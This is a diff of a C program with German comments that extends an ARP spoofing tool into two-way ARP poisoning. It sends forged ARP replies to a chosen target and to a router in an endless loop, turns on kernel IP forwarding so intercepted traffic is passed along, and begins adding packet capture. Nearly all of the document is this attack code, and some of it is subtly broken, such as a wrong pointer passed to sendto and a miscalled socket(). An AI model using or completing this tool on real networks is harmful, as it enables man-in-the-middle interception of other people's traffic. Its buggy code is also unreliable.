@@ -1,6 +1,7 @@
 #include <linux/if_ether.h>
 #include <linux/if_arp.h>
 #include <linux/if_packet.h>
+#include <pcap/pcap.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -10,6 +11,7 @@
 #include <sys/ioctl.h>
 #include <arpa/inet.h>
 #include <unistd.h>
+#include <pcap.h>
 
 void print_mac(const unsigned char *mac){
     printf("%02x:%02x:%02x:%02x:%02x:%02x\n", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
@@ -120,46 +122,87 @@ int send_arp_package(int raw_sockfd, struct arp_packet *arp_p, int if_index, uns
     if (sendto(raw_sockfd, &arp_p, sizeof(struct arp_packet), 0,
                (struct sockaddr*)&sa_ll, sizeof(sa_ll)) == -1) {
         perror("sendto");
-        close(raw_sockfd);
         return -1;
     }
     printf("ARP-Paket gesendet.\n");
     return 0;
 }
 
-int main(int argc, char *argv[])
-{
-    if (argc < 3 || argc > 4) {
-        fprintf(stderr, "Usage: %s <target_ip> <spoof_ip> [target-mac]\n", argv[0]);
-        exit(1);
+/**
+ * @brief Aktiviert oder deaktiviert das IP-Forwarding im Linux-Kernel.
+ *
+ * @param enable Wenn 1, wird IP-Forwarding aktiviert. Wenn 0, wird es deaktiviert.
+ * @return 0 bei Erfolg, -1 bei Fehler.
+ */
+int set_ip_forwarding(int enable) {
+    FILE *fp;
+    const char *path = "/proc/sys/net/ipv4/ip_forward";
+    char value_str[2]; // Für "0" oder "1" + Nullterminator
+
+    // Datei zum Schreiben öffnen
+    fp = fopen(path, "w");
+    if (fp == NULL) {
+        fprintf(stderr, "Fehler: Kann '%s' nicht öffnen. Stellen Sie sicher, dass Sie Root-Rechte haben.\n", path);
+        return -1;
     }
 
+    // Wert schreiben
+    if (enable) {
+        strcpy(value_str, "1");
+        printf("[INFO] Versuche, IP-Forwarding zu aktivieren...\n");
+    } else {
+        strcpy(value_str, "0");
+        printf("[INFO] Versuche, IP-Forwarding zu deaktivieren...\n");
+    }
+
+    if (fputs(value_str, fp) == EOF) {
+        fprintf(stderr, "Fehler: Kann Wert nicht in '%s' schreiben.\n", path);
+        fclose(fp);
+        return -1;
+    }
+
+    // Datei schließen
+    if (fclose(fp) == EOF) {
+        fprintf(stderr, "Fehler: Kann '%s' nicht schließen.\n", path);
+        return -1; // Könnte auch ein fataler Fehler sein, da der Status unklar ist
+    }
+
+    printf("[INFO] IP-Forwarding auf %d gesetzt.\n", enable);
+    return 0;
+}
+
+int main(int argc, char *argv[])
+{
+ if (argc != 5) { // Jetzt exakt 5 Argumente (Programmname + 4 Parameter)
+        fprintf(stderr, "Usage: %s <target_ip> <router_ip> <target_mac> <router_mac>\n", argv[0]);
+        exit(1);
+    }
     const char* iface_name = "wlan0";
     const char* target_ip_str = argv[1];
     const char* spoof_ip_str = argv[2];
 
     struct arp_packet arp_p;
+    struct arp_packet arp_p2;
 
     int raw_sockfd;
+    int in_sockfd;
     int if_index;
     unsigned char local_mac[ETH_ALEN];
     unsigned char target_mac_bytes[ETH_ALEN];
-    unsigned char broadcast_mac_val[ETH_ALEN] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+    unsigned char target_2_mac_bytes[ETH_ALEN];
 
-    if (argc == 4) {
-        printf("Using provided target MAC: %s\n", argv[3]);
-        if (mac_aton(argv[3], target_mac_bytes) != 0) {
-            fprintf(stderr, "Error: Invalid target MAC address format. Use AA:BB:CC:DD:EE:FF\n");
-            return 1;
-        }
-    } else {
-        printf("Using Broadcast as target MAC address.\n");
-        memcpy(target_mac_bytes, broadcast_mac_val, ETH_ALEN);
+    pcap_t *handle; // Handler für die pcap-Sizung
+    char errbuf[PCAP_ERRBUF_SIZE]; // Buffer für die Fehlermeldungen
+
+    if (mac_aton(argv[3], target_mac_bytes) != 0 || mac_aton(argv[4], target_2_mac_bytes) != 0) {
+        fprintf(stderr, "Error: Invalid target MAC address format. Use AA:BB:CC:DD:EE:FF\n");
+        return 1;
     }
 
     raw_sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
     if (raw_sockfd == -1) {
         perror("raw_sockfd creation");
+        return 1;
     }
     printf("Raw Socket für ARP-Pakete erstellt.\n");
 
@@ -168,17 +211,47 @@ int main(int argc, char *argv[])
         return 1;
     }
     
-    build_arp_package(&arp_p, target_mac_bytes, local_mac, spoof_ip_str, target_ip_str);
+    build_arp_package(&arp_p, target_mac_bytes, local_mac, spoof_ip_str, target_ip_str); // target 1
+    build_arp_package(&arp_p2, target_2_mac_bytes, local_mac, target_ip_str, spoof_ip_str); // target 2
    
-    if(send_arp_package(raw_sockfd, &arp_p, if_index, target_mac_bytes) == -1){
-        perror("send");
+    if(socket(in_sockfd, SOCK_RAW, htons(ETH_P_ALL))){
+        perror("socket");
+        close(raw_sockfd);
+        return 1;
+    }
+    printf("Capture Socket erstellt\n");
+
+    // Ipv4 forwarding sysctl auf 1 setzen
+    if(set_ip_forwarding(1) == -1){
+        perror("ip_forward");
+        close(raw_sockfd);
+        close(in_sockfd);
         return 1;
     }
 
     while(1){
-         
+
+        if(send_arp_package(raw_sockfd, &arp_p, if_index, target_mac_bytes) == -1){
+            fprintf(stderr, "Error sending ARP packet to target. Exiting poisoning loop.\n");
+            break;
+        }
+
+        if(send_arp_package(raw_sockfd, &arp_p2, if_index, target_2_mac_bytes) == -1){
+            fprintf(stderr, "Error sending ARP packet to router. Exiting poisoning loop.\n");
+            break;
+        }
+        sleep(2); 
+    }
+
+    // Ipv4 forwarding sysctl auf 0 setzen
+    if(set_ip_forwarding(0) == -1){
+        perror("ip_forward");
+        close(raw_sockfd);
+        close(in_sockfd);
+        return 1;
     }
 
     close(raw_sockfd);
+    close(in_sockfd);
     return 0;
 }
